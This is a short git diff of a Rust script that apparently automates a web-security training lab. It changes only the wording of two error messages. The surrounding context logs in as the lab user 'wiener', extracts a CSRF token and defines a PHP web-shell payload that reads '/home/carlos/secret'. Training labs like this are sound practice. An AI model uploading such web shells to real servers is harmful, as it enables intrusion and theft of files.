@@ -67,7 +67,7 @@ fn main() {
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
 
     // extract csrf token
-    let mut csrf = extract_csrf(login_page).expect(&format!("{}", "[!] Failed extract csrf".red()));
+    let mut csrf = extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));
 
     println!("{}", "OK".green());
     print!("{}", "⦗3⦘ Logging in as wiener.. ".white(),);
@@ -101,7 +101,7 @@ fn main() {
         .expect(&format!("{}", "[!] Failed to fetch wiener profile".red()));
 
     // extract csrf token
-    csrf = extract_csrf(wiener).expect(&format!("{}", "[!] Failed extract csrf".red()));
+    csrf = extract_csrf(wiener).expect(&format!("{}", "[!] Failed to extract the csrf".red()));
 
     // the shell file to be uploaded
     let shell_file = r###"<?php echo file_get_contents("/home/carlos/secret") ?>"###;
